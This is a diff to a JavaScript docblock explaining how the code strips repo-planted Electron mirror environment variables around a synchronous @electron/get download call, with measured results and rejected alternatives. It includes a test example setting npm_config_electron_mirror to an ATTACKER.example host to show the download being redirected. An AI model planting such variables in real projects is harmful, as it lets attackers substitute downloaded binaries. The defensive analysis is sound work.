@@ -137,21 +137,70 @@ function isRepoPlantedName(name) {
  * a wasted download, not a compromise — but a stated threat model that is wider
  * than the code is its own defect.
  *
- * AROUND THE SYNCHRONOUS CALL ONLY, and that is enough. MEASURED in the
- * installed @electron/get 5.0.0: `downloadArtifact` reads every repo-plantable
- * name in its SYNCHRONOUS PREFIX — `getArtifactVersion` then
- * `getArtifactRemoteURL`, whose five `mirrorVar` calls (dist/artifact-utils.js,
- * lines 20-35) all run before that function reaches any `await`, and nothing in
- * `downloadArtifact` awaits before them. The promise is returned UNAWAITED, so a
- * long-lived MCP process never sees a scrubbed env across an await. This is the
- * contract `utils/engine-output-flag.js :: withOutputTokenFlag` already ships,
- * copied deliberately rather than reinvented.
+ * ── WHAT IT COVERS, MEASURED RATHER THAN REASONED (round 3, seat B1) ───────
+ * The previous version of this docblock ARGUED, from a source read, that every
+ * repo-plantable name is read in `downloadArtifact`'s synchronous prefix. Seat
+ * B1 called that "an unverified invariant about @electron/get internals" and
+ * was right to: the argument had never been run, and the scrub pattern was
+ * copied from `utils/engine-output-flag.js :: withOutputTokenFlag`, where it is
+ * correct only because the thing it guards reads the env synchronously at spawn.
  *
- * NAMED LIMIT, because the scrub does not cover it: `validateArtifact`'s
- * recursive `SHASUMS256.txt` fetch happens AFTER awaits, with the environment
- * restored. It is reachable only when no `checksums` table went out — i.e. on
- * the already-unpinned, already-`unverified` path, where the mirror is what
- * vouches for the bytes in the first place.
+ * So it was MEASURED, against the INSTALLED @electron/get 5.0.0 (Node 24.18.0,
+ * Windows 11), by replacing `process.env` with a recording Proxy and driving a
+ * real `downloadArtifact` with an injected offline downloader:
+ *
+ *   PINNED call (amicus's normal route — a `checksums` table goes out)
+ *     20 repo-plantable reads, ALL INSIDE the scrub window; 0 after the restore.
+ *     Four knobs on a stable version (`customVersion` from `getArtifactVersion`,
+ *     then `mirror`, `customDir`, `customFilename` from `getArtifactRemoteURL`)
+ *     x five repo-reachable spellings; `nightlyMirror` adds five on a nightly.
+ *     POSITIVE CONTROL, `npm_config_electron_mirror=https://ATTACKER.example/mirror/`:
+ *       scrubbed   -> https://github.com/electron/electron/releases/download/v43.1.1/…
+ *       unscrubbed -> https://ATTACKER.example/mirror/ATTACKERDIR/ATTACKER.zip
+ *     The scrub is therefore NOT a no-op: it is what puts that download back on
+ *     the official URL.
+ *
+ *   UNPINNED call (no anchor, or the hatch dropped the pin — no `checksums`)
+ *     The same 20 land inside the window and the ARTIFACT still comes from the
+ *     official URL. Then `validateArtifact` recursively `downloadArtifact`s
+ *     `SHASUMS256.txt` AFTER awaits, with the environment restored, and reads
+ *     the planted names back — 13, not 20, because `mirrorVar`'s `||` chain
+ *     short-circuits as soon as a planted name answers.
+ *
+ * THE RESIDUAL IS AVAILABILITY-ONLY, and that is why it is documented rather
+ * than closed. The zip's URL was already fixed inside the scrub, so a planted
+ * mirror cannot substitute the bytes — it can only serve a checksum file that
+ * disagrees with the official artifact, which FAILS the download. Stated in
+ * `docs/configuration.md` in those terms; that page used to say these names stay
+ * stripped "for the length of amicus's own download call", which is wider than
+ * the code and is corrected.
+ *
+ * ── NOTHING OUTSIDE CAN OBSERVE IT (seat B3, REFUTED BY MEASUREMENT) ───────
+ * B3 read this as mutating shared `process.env` "while the download is still in
+ * flight", so "concurrent repairs can interleave". They cannot: delete -> call
+ * -> restore contains no `await`, so it is ONE synchronous turn and no other
+ * task can be scheduled inside it. MEASURED: two concurrent scrubbed downloads
+ * with an outside observer sampling `process.env` from the microtask, immediate
+ * and timer queues — 11380 samples, 0 saw a scrubbed environment, and both
+ * resolved to the official URL. The await-free window IS the control, which is
+ * why `fn` is called synchronously and its promise is returned UNAWAITED.
+ * `tests/electron-env-scrub-get5-contract.test.js` re-measures every number
+ * above against the installed library on each run, so a @electron/get that moves
+ * a read past an await turns red there instead of in the field.
+ *
+ * ── THREE REMEDIES CONSIDERED AND REJECTED, each with its reason ───────────
+ * 1. Pass the values instead of scrubbing. IMPOSSIBLE: `mirrorVar` ranks
+ *    `process.env` ABOVE `options[name]` (dist/artifact-utils.js, lines 20-35),
+ *    so a planted name beats anything amicus puts in `mirrorOptions`.
+ * 2. `mirrorOptions.resolveAssetURL`, which does override the URL outright and
+ *    IS inherited by the recursive SHASUMS256 call. Rejected: it bypasses
+ *    `base` entirely, so a machine owner's bare `ELECTRON_MIRROR` — which this
+ *    module deliberately keeps — would silently stop being honoured, and amicus
+ *    would have to hand-build electron release URLs.
+ * 3. Hold the scrub for the whole call. Rejected by the finding itself: that is
+ *    the shared-mutation-across-an-await B3 filed, and it would hand a scrubbed
+ *    environment to every unrelated child a long-lived MCP process spawns in
+ *    that window.
  *
  * `delete` and restore, not `= undefined`: assigning undefined to a process.env
  * key stores the STRING 'undefined', which `mirrorVar` would read as a truthy
